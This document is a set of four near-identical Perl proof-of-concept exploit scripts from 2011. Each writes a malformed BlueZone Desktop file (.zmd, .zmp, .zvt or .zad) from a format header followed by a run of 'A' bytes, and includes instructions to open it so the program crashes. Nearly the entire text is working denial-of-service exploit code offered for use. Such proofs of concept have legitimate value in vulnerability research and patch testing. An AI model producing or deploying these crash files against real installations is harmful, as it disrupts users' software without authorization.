# Exploit Title: BlueZone Desktop Malformed .zmd file Local Denial of Service
# Date: 10-24-11
# Author: Silent Dream
# Software Link: http://www.rocketsoftware.com/bluezone/downloads/desktop-free-trial
# Version: Latest
# Tested on: Windows XP SP3
 #To trigger: Run this script, double click file to open with bzmd.exe, program dies.
 
my $file = "bluez.zmd";
my $head = "BZMD215AK";
my $junk = "A" x 20;
 
open($File, ">$file");
print $File $head.$junk;
close($FILE);

exit();
# Exploit Title: BlueZone Desktop Malformed .zmp file Local Denial of Service
# Date: 10-24-11
# Author: Silent Dream
# Software Link: http://www.rocketsoftware.com/bluezone/downloads/desktop-free-trial
# Version: Latest
# Tested on: Windows XP SP3
#To trigger: Run this script, double click file to open with bzmp.exe, program dies.
 
my $file = "bluez.zmp";
my $head = "BZMP215AK";
my $junk = "A" x 20;
 
open($File, ">$file");
print $File $head.$junk;
close($FILE);

exit();
# Exploit Title: BlueZone Desktop Malformed .zvt file Local Denial of Service
# Date: 10-24-11
# Author: Silent Dream
# Software Link: http://www.rocketsoftware.com/bluezone/downloads/desktop-free-trial
# Version: Latest
# Tested on: Windows XP SP3
#To trigger: Run this script, double click file to open with bzvt.exe, program dies.
 
my $file = "bluez.zvt";
my $head = "BZVT100AK";
my $junk = "A" x 20;
 
open($File, ">$file");
print $File $head.$junk;
close($FILE);

exit();
# Exploit Title: BlueZone Desktop Malformed .zad file Local Denial of Service
# Date: 10-24-11
# Author: Silent Dream
# Software Link: http://www.rocketsoftware.com/bluezone/downloads/desktop-free-trial
# Version: Latest
# Tested on: Windows XP SP3
#To trigger: Run this script, double click file to open with bzad.exe, program dies.
 
my $file = "bluez.zad";
my $head = "BZAD200BK";
my $junk = "A" x 20;
 
open($File, ">$file");
print $File $head.$junk;
close($FILE);